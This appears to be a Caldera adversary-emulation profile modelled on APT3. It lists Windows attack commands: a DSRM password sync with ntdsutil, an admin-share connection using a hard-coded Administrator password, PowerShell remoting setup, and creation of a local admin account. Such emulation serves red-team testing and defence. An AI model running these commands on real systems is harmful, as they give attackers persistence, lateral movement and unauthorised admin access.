adversary_id: custom_adversary_profile__APT_3__APT3_Phase2_Pattern_1__2023-10-19-22_32_30
name: Custom Adversary Profile
description: [['stockpile__privilege_escalation', 'atomic__privilege_escalation'], ['stockpile__persistence', 'atomic__persistence'], ['stockpile__lateral-movement', 'atomic__lateral-movement'], ['stockpile__execution', 'atomic__execution']]
atomic_ordering:
- 4688d6eebcad6536896d298a7f22c733 # ('4688d6eebcad6536896d298a7f22c733', 'None', 'None') ; {'description': 'Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account\n', 'tactic': 'persistence', 'technique': {'attack_id': 'T1098', 'name': 'Account Manipulation'}, 'platforms': {'windows': {'cmd': {'cleanup': '', 'command': 'ntdsutil "set dsrm password" "sync from domain account %username%" "q" "q"', 'payloads': []}}}, 'id__dependence__fact': ['4688d6eebcad6536896d298a7f22c733', 'None', 'None'], 'plugin': 'atomic'}
- fe8f012ae5cdde2d5e3bba7b8ea95d93 # ('fe8f012ae5cdde2d5e3bba7b8ea95d93', 'None', 'None') ; {'description': 'Connecting To Remote Shares\n', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.002', 'name': 'Remote Services: SMB/Windows Admin Shares'}, 'platforms': {'windows': {'cmd': {'cleanup': '', 'command': 'cmd.exe /c "net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator"', 'payloads': []}}}, 'id__dependence__fact': ['fe8f012ae5cdde2d5e3bba7b8ea95d93', 'None', 'None'], 'plugin': 'atomic'}
- 6dbada37ec09d7bb640deec0af59eaf5 # ('6dbada37ec09d7bb640deec0af59eaf5', 'None', 'validate_me') ; {'description': "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n", 'tactic': 'execution', 'technique': {'attack_id': 'T1059.001', 'name': 'Command and Scripting Interpreter: PowerShell'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': 'Try {;     New-PSSession -ComputerName $env:COMPUTERNAME -ErrorAction Stop | Out-Null;      ; } ; Catch {;     Enable-PSRemoting; };  ;  New-PSSession -ComputerName $env:COMPUTERNAME; Test-Connection $env:COMPUTERNAME; Set-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"; Get-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use; Remove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['6dbada37ec09d7bb640deec0af59eaf5', 'None', 'validate_me'], 'plugin': 'atomic'}
- 48d31e40ff939a9ea616219271b1b7a8 # ('48d31e40ff939a9ea616219271b1b7a8', 'None', 'None') ; {'description': 'Creates a new admin user in a command prompt.\n', 'tactic': 'persistence', 'technique': {'attack_id': 'T1136.001', 'name': 'Create Account: Local Account'}, 'platforms': {'windows': {'cmd': {'cleanup': 'net user /del "T1136.001_Admin" >nul 2>&1', 'command': 'net user /add "#{username}" "#{password}" && net localgroup administrators "#{username}" /add', 'payloads': []}}}, 'id__dependence__fact': ['48d31e40ff939a9ea616219271b1b7a8', 'None', 'None'], 'plugin': 'atomic'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []